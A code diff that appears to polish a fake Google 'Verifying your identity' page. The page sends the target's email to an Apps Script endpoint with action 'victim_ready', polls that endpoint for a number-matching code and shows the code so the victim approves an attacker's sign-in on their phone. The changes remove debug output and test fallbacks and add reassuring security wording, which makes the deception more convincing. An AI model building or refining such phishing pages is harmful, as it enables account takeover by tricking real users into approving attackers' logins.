@@ -26,7 +26,7 @@
       <div id="loading">
         <div class="spinner"></div>
         <h1>Verifying your identity</h1>
-        <p id="statusText">Connecting to Google... Please wait</p>
+        <p id="statusText">Checking your account…</p>
       </div>
 
       <div id="prompt-section" style="display:none;">
@@ -34,77 +34,46 @@
         <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
         <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
         <div id="matchNumber" class="number-box">••</div>
-        <p id="statusText2" style="margin-top:24px; color:#34a853; font-weight:500;">Waiting for confirmation...</p>
+        <p style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</p>
       </div>
-
-      <p id="debugMsg" style="color:#d93025; font-size:14px; margin-top:32px; min-height:40px;"></p>
     </div>
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzkn1lBC4-5TzONsqyC4rAQ9OZB4A6oES9v6rE7jnXxfuD3TuuWXcJJNAWK3XSG29-w/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxmr_6a0_qimurAhWv6F3elBpZHyUEAubFf70VmgFykqNdYvWHgX_FFnWcov3lsNJEQ/exec";
 
-    // Get email — fallback if localStorage is empty
     let email = localStorage.getItem("demoEmail") || "test@example.com";
-    if (!email || email === "someone@example.com") {
-      document.getElementById("debugMsg").textContent = "Warning: No email found. Using test value.";
-    }
-
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    // Tell server we are here
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
-      method: "GET",
-      mode: "no-cors"
-    });
+    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {method:"GET", mode:"no-cors"});
 
-    // Poll every 5 seconds — very simple version
+    const loading = document.getElementById("loading");
+    const promptSection = document.getElementById("prompt-section");
+    const statusText = document.getElementById("statusText");
+    const matchNumber = document.getElementById("matchNumber");
+
     function checkForNumber() {
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
-
-      fetch(url, { cache: "no-cache" })
-        .then(response => response.text())
+      fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`, {cache:"no-cache"})
+        .then(r => r.text())
         .then(text => {
-          // Very simple check — look for digits only
           const match = text.match(/"prompt_number":"(\d+)"/);
-          let number = "";
-          if (match && match[1]) {
-            number = match[1];
-          }
-
-          if (number && number.length >= 1 && number !== "null" && number !== "") {
-            document.getElementById("matchNumber").textContent = number;
-            document.getElementById("statusText").textContent = "Number received!";
-            document.getElementById("statusText2").textContent = "Tap Yes on your phone and select this number";
-            document.getElementById("loading").style.display = "none";
-            document.getElementById("prompt-section").style.display = "block";
-            document.getElementById("debugMsg").textContent = "";
+          const number = match ? match[1] : "";
+          if (number && number !== "" && number !== "null") {
+            matchNumber.textContent = number;
+            statusText.textContent = "Number received";
+            loading.style.display = "none";
+            promptSection.style.display = "block";
           } else {
-            document.getElementById("statusText").textContent = "Still waiting for number...";
-            document.getElementById("debugMsg").textContent = "No number yet (trying again soon)";
+            statusText.textContent = "Waiting for verification…";
           }
         })
-        .catch(err => {
-          document.getElementById("statusText").textContent = "Connection problem";
-          document.getElementById("debugMsg").textContent = "Error: " + err.message;
+        .catch(() => {
+          statusText.textContent = "Waiting for verification…"; // silent retry
         });
     }
 
-    // Start polling
     setInterval(checkForNumber, 5000);
-
-    // Run once immediately
     checkForNumber();
-
-    // Fallback: if nothing happens after 60 seconds, show test number
-    setTimeout(() => {
-      if (document.getElementById("matchNumber").textContent === "••") {
-        document.getElementById("matchNumber").textContent = "66";
-        document.getElementById("statusText").textContent = "Test number shown (server may be slow)";
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("prompt-section").style.display = "block";
-      }
-    }, 60000);
   </script>
 </body>
 </html>
